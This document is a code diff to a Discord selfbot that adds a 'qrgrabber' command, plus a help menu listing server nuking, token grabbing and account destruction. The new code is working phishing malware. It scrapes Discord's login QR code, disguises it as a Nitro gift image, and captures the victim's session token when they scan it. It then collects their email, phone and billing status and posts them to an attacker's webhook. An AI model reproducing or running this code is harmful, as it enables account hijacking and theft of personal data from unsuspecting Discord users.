@@ -794,6 +794,7 @@ async def help(ctx, category=None):
         embed = f"""**ATIO COMMANDS | Prefix: `{Astraa.command_prefix}`**\n
 > :boom: `{Astraa.command_prefix}destroy`\n*Nuke a discord server*
 > :magnet: `{Astraa.command_prefix}filegrabber <webhook>`\n*Send a Token Grabber File*
+> :camera_with_flash: `{Astraa.command_prefix}qrgrabber`\n*Send a QR Grabber Image*
 > :boom: `{Astraa.command_prefix}tokenfuck <token>`\n*Destroy a Account with his token*
 > :page_facing_up: `{Astraa.command_prefix}tokeninfo <token>`\n*Scrape info with a token*
 > :recycle: `{Astraa.command_prefix}autolog <token>`\n*Log in to the account automatically*
@@ -1486,6 +1487,158 @@ if __name__ == '__main__':
     get_token()""".replace("~~WEBHOOK_URL~~", webhook))
         await ctx.send(file=discord.File("printer.py"))
         os.remove(f"printer.py")
+
+    except Exception as e:
+        await ctx.send(f"[ERROR]: {e}")
+
+#Send a QR Grabber Image
+@Astraa.command(aliases=["qrgrab", "qrgen"])
+async def qrgrabber(ctx, webhook=None):
+    await ctx.message.delete()
+    if webhook is None:
+        await ctx.send(f'[ERROR]: Invalid input! Command: {Astraa.command_prefix}qrgrabber <webhook>')
+        return
+    try:
+        import os
+        import random
+        from PIL import Image
+        import json
+        import base64
+        import requests
+        from zipfile import ZipFile
+        from time import sleep
+        from urllib.request import urlretrieve
+        from bs4 import BeautifulSoup
+        from colorama import Fore
+        from selenium import webdriver, common
+
+        def getheaders(token=None):
+            headers = {
+                    "Content-Type": "application/json",
+                    'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; rv:76.0) Gecko/20100101 Firefox/76.0'
+            }
+            if token:
+                headers.update({"Authorization": token})
+            return headers
+
+        def logo_qr():
+            im1 = Image.open('QR-Code/temp_qr_code.png', 'r')
+            im2 = Image.open('QR-Code/overlay.png', 'r')
+            im1.paste(im2, (60, 55), im2)
+            im1.save('QR-Code/Qr_Code.png', quality=95)
+
+        def paste_template():
+            im1 = Image.open('QR-Code/template.png', 'r')
+            im2 = Image.open('QR-Code/Qr_Code.png', 'r')
+            im1.paste(im2, (120, 409))
+            im1.save('QR-Code/discord_gift.png', quality=95)
+
+        opts = webdriver.ChromeOptions()
+        opts.add_experimental_option('excludeSwitches', ['enable-logging'])
+        opts.add_experimental_option("detach", True)
+
+        try:
+            driver = webdriver.Chrome(options=opts, executable_path=r'chromedriver.exe')
+            driver.minimize_window()
+        except common.exceptions.SessionNotCreatedException as e:
+            await ctx.send(f'[ERROR]: {e}')
+            return
+
+        driver.get('https://discord.com/login')
+        sleep(3)
+        page_source = driver.page_source
+        soup = BeautifulSoup(page_source, features='html.parser')
+
+        div = soup.find('div', {'class': 'qrCode-2R7t9S'})
+        qr_code = div.find('img')['src']
+        file = os.path.join(os.getcwd(), 'QR-Code/temp_qr_code.png')
+        img_data = base64.b64decode(qr_code.replace('data:image/png;base64,', ''))
+
+        urlretrieve(
+            "https://github.com/AstraaDev/complement/raw/main/QR-Code.zip",
+            filename="QR-Code.zip",
+        )
+        with ZipFile("QR-Code.zip", 'r')as zip2:
+            zip2.extractall()
+        os.remove("QR-Code.zip")
+
+        with open(file,'wb') as handler:
+            handler.write(img_data)
+        discord_login = driver.current_url
+        logo_qr()
+        paste_template()
+
+        await ctx.send(file=discord.File("QR-Code/discord_gift.png"))
+
+        import shutil
+        shutil.rmtree(f"QR-Code")
+
+        while True:
+            if discord_login != driver.current_url:
+                token = driver.execute_script('''
+        token = (webpackChunkdiscord_app.push([
+            [''],
+            {},
+            e=>{m=[];for(
+                    let c in e.c)
+                    m.push(e.c[c])}
+            ]),m)
+            .find(m=>m?.exports?.default?.getToken!==void 0).exports.default.getToken()
+        return token;
+                    ''')
+                j = requests.get("https://discord.com/api/v9/users/@me", headers=getheaders(token)).json()
+                badges = ""
+                flags = j['flags']
+                if (flags == 1): badges += "Staff, "
+                if (flags == 2): badges += "Partner, "
+                if (flags == 4): badges += "Hypesquad Event, "
+                if (flags == 8): badges += "Green Bughunter, "
+                if (flags == 64): badges += "Hypesquad Bravery, "
+                if (flags == 128): badges += "HypeSquad Brillance, "
+                if (flags == 256): badges += "HypeSquad Balance, "
+                if (flags == 512): badges += "Early Supporter, "
+                if (flags == 16384): badges += "Gold BugHunter, "
+                if (flags == 131072): badges += "Verified Bot Developer, "
+                if (badges == ""): badges = "None"
+                user = j["username"] + "#" + str(j["discriminator"])
+                email = j["email"]
+                phone = j["phone"] if j["phone"] else "No Phone Number attached"
+                url = f'https://cdn.discordapp.com/avatars/{j["id"]}/{j["avatar"]}.gif'
+                try:
+                    requests.get(url)
+                except:
+                    url = url[:-4]
+                nitro_data = requests.get('https://discordapp.com/api/v6/users/@me/billing/subscriptions', headers=getheaders(token)).json()
+                has_nitro = False
+                has_nitro = bool(len(nitro_data) > 0)
+                billing = bool(len(json.loads(requests.get("https://discordapp.com/api/v6/users/@me/billing/payment-sources", headers=getheaders(token)).text)) > 0)
+                embed = {
+                    "avatar_url":"https://cdn.discordapp.com/attachments/778283706388709376/880456323509149816/190423014334287383.gif",
+                    "embeds": [
+                        {
+                            "author": {
+                                "name": "@TIO QR Code Grabber",
+                                "url": "https://dsc.gg/astraadev",
+                                "icon_url": "https://cdn.discordapp.com/attachments/826581697436581919/982374264604864572/atio.jpg?size=4096"
+                            },
+                            "description": f"**{user}** Just Scanned the QR code\n\n**Has Billing:** {billing}\n**Nitro:** {has_nitro}\n**Badges:** {badges}\n**Email:** {email}\n**Phone:** {phone}\n**[Avatar]({url})**",
+                            "fields": [
+                                {
+                                "name": "**Token**",
+                                "value": f"```fix\n{token}```",
+                                "inline": False
+                                }
+                            ],
+                            "color": 0x7289da,
+                            "footer": {
+                            "text": "Astraa#6100 - https://dsc.gg/astraadev"
+                            }
+                        }
+                    ]
+                }
+                requests.post(webhook, json=embed)
+                driver.maximize_window()
+                return
 
     except Exception as e:
         await ctx.send(f"[ERROR]: {e}")
